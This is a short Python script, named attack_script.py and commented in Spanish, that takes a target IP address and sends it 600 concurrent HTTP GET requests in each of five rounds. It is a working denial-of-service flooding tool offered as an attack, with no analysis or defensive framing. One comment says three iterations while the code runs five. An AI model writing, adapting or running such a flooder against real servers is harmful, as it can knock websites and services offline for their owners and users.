import sys
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

if len(sys.argv) != 2:
    print("Usage: python attack_script.py <target_ip>")
    sys.exit(1)

target_ip = sys.argv[1]
url = f"http://{target_ip}"

def make_request(url):
    try:
        response = requests.get(url)
        print(f"Requested {url} - Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error requesting {url}: {e}")

# Número de solicitudes concurrentes
num_requests = 600  

# Ejecutar el bucle tres veces
for _ in range(5):
    print(f"Ejecutando iteración {_ + 1}")
    
    # Utilizando ThreadPoolExecutor para realizar múltiples solicitudes en paralelo
    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        futures = []
        for _ in range(num_requests):
            future = executor.submit(make_request, url)
            futures.append(future)

        # Esperar a que todas las solicitudes se completen
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Exception during request: {e}")

    # Tiempo para permitir que se completen todas las solicitudes antes de la siguiente iteración
    time.sleep(5)